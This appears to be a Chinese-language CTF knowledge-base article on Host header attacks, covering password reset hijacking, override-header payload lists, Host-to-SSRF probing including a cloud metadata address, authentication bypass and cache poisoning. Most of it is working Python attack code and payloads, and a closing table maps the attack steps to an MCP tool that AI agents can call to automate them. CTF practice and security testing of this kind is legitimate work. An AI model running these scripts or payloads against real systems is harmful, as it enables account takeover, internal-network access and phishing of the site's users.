---
id: "ctf-website/02-auth/host-header"
title: "Host Header 攻击"
title_en: "Host Header Attacks"
summary: >
  介绍 Host 头注入的攻击面与利用方法，包括密码重置劫持、Host 头注入变体、Host-to-SSRF 链、鉴权绕过及 Cache Poisoning 链。覆盖多种 Host override header 的 fuzzing payload 和完整攻击链。
summary_en: >
  A practical guide to Host header injection attacks covering password reset hijacking, injection variants, Host-to-SSRF chaining, authentication bypass, and cache poisoning. Includes fuzzing payloads for multiple Host override headers and complete attack chains.
board: "ctf-website"
category: "02-auth"
signals: ["Host header", "密码重置劫持", "Host注入", "SSRF", "Cache Poisoning", "X-Forwarded-Host", "vhost"]
mcp_tools: ["http_probe"]
keywords: ["host header attack", "密码重置劫持", "SSRF", "Host注入", "X-Forwarded-Host", "缓存投毒", "vhost绕过"]
difficulty: "intermediate"
tags: ["authentication", "host-header", "ssrf", "web-security", "injection", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# Host Header 攻击

## 攻击面

```
Host 头被后端用于:
├── URL 生成 (密码重置链接、回调 URL)
├── 虚拟主机路由 (vhost)
├── 缓存 key 生成
├── SSO/IdP 回调验证
└── 密码重置 token 邮箱链接
```

## 1. 密码重置劫持

```python
# 场景: POST /forgot {email: victim@x.com}
# 后端生成重置链接: https://{Host}/reset?token=xxx

# 攻击: 修改 Host 头
# Host: attacker.com
# → 受害者收到的邮件链接: https://attacker.com/reset?token=xxx
# → 攻击者拿到 token

import requests

def hijack_password_reset(target: str):
    """修改 Host 头劫持重置 token"""
    r = requests.post(f"{target}/forgot", data={
        "email": "victim@victim.com"
    }, headers={
        "Host": "attacker.com",
        "X-Forwarded-Host": "attacker.com",  # 如果后端用这个
    })
    return r.status_code
```

## 2. Host 头注入变体

```python
HOST_VALUES = [
    "attacker.com",
    "target.com:1337",
    "target.com@attacker.com",
    "attacker.com#target.com",
    "attacker.com%23target.com",
    "attacker.com%2ftarget.com",
    "target.com.evil.com",
    "localhost",
    "127.0.0.1",
    "[::1]",
]

OVERRIDE_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "X-Original-Host",
    "X-Rewrite-URL",
    "Forwarded",
]
```

### 2.1 代理/框架取值优先级

| 层 | 常见取值 | 打点动作 | 命中信号 |
|---|---|---|---|
| Web server | `Host` | 改 Host 观察 vhost/跳转 | `Location`、页面标题变化 |
| 反向代理 | `X-Forwarded-Host` | Host 正常，XFH 改 evil | 生成链接使用 XFH |
| CDN | `Forwarded: host=` | 加 RFC 7239 header | 缓存 key 或跳转变化 |
| 应用框架 | `X-Original-Host` / `X-Host` | 多 header 竞争 | 密码重置/回调 URL 变化 |
| 业务配置 | `base_url` | Header 全改也无效 | 固定域名输出 |

同一个请求里放多个 header 时，要看谁覆盖谁：

```python
import requests

def host_header_matrix(url, evil="attacker.example"):
    baseline = requests.get(url, allow_redirects=False)
    tests = []
    for header in OVERRIDE_HEADERS:
        headers = {"Host": "target.example"}
        if header == "Forwarded":
            headers[header] = f"host={evil};proto=https"
        else:
            headers[header] = evil
        tests.append((header, headers))
    tests.append(("Host", {"Host": evil}))

    for name, headers in tests:
        r = requests.get(url, headers=headers, allow_redirects=False, timeout=8)
        loc = r.headers.get("Location", "")
        changed = (r.status_code, loc, len(r.text)) != (
            baseline.status_code,
            baseline.headers.get("Location", ""),
            len(baseline.text),
        )
        print(name, r.status_code, changed, loc[:160])
```

成功样本：`Location`、邮件预览、JSON 中 `baseUrl`、HTML canonical URL、OpenGraph URL、OAuth callback 使用了攻击者 host。失败样本：只返回 `400 Bad Request`，说明 Web server 层已经拦掉，还没进入应用。

## 3. Host → SSRF 链

```python
# 如果后端用 Host 头拼接 URL 做服务间调用:
# GET /api/status → 后端请求 http://{Host}/internal/health
# Host: 127.0.0.1 → 后端请求 http://127.0.0.1/internal/health
# → SSRF 打内网服务

# 探测: 修改 Host 为内网地址
for internal in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "169.254.169.254"]:
    r = requests.get(target, headers={"Host": internal})
    if r.status_code != baseline:
        print(f"[!] {internal} → {r.status_code}")
```

## 4. Host 头鉴权绕过

```python
# 如果鉴权逻辑基于 Host:
# if Host == "admin.internal" → 跳过认证
# 攻击: Host: admin.internal → 直接进后台

# 或者: Host: localhost → 触发 debug 模式 → 报错泄露源码
```

## 5. Host → Cache Poisoning 链

```python
# Host 头如果不在 Cache Key 中:
# 首次请求 Host: evil.com → CDN 缓存响应
# 后续所有用户看到此缓存 → XSS/Phish
# 详见 08-infra/race-cache-smuggling.md
```

### 5.1 Absolute URL 生成点

Host 注入不只在密码重置里出现，所有“后端拼绝对 URL”的地方都值得测：

| 功能 | 观察位置 | Payload |
|---|---|---|
| 密码重置 | 邮件链接/预览接口 | `Host: attacker.com` |
| 邮箱验证 | verify link | `X-Forwarded-Host` |
| OAuth/OIDC | `redirect_uri` / issuer | `Forwarded: host=` |
| Sitemap/RSS | `<loc>` / feed link | Host/XFH |
| 文件下载 | signed URL | Host 带端口/协议 |
| Webhook | callback URL | `X-Forwarded-Proto: http` |
| Cache | `Location` / canonical | Host 不进 cache key |

如果目标有“发送邮件但看不到邮件”的限制，优先找同功能的预览接口、队列日志、前端 toast、`/api/debug/mail`、管理后台邮件模板记录。

## 6. 攻击链

```
Host 注入 → 密码重置 token 泄露 → Account Takeover
Host 注入 → 后端 URL 拼接 → SSRF → 内网 RCE
Host: localhost → Debug 模式 → 源码泄露 → 硬编码密钥
Host override → Vhost 路由绕过 → 管理后台 → RCE
```

## 工具引用

```bash
# 项目内 HTTP 探测框架
python scripts/ctf-website/http_probe.py

# 安装第三方工具
powershell scripts/ctf-website/install_missing_tools.ps1
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| Host header 注入探测 | `http_probe` | HTTP GET 探测，验证 Host header 篡改效果 |
| 路由绕过验证 | `http_probe` | 探测 X-Forwarded-Host/X-Real-IP 等 header 效果 |

## Evidence

- 保存 baseline、每个 header 变体、响应状态、`Location`、正文里出现的绝对 URL。
- 对密码重置/邮箱验证记录：触发请求、邮件/预览里的最终链接、token 所属账号、token 是否可用。
- 对 cache 场景记录：缓存命中头、cache key 推断、首个投毒请求和后续命中请求。
- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
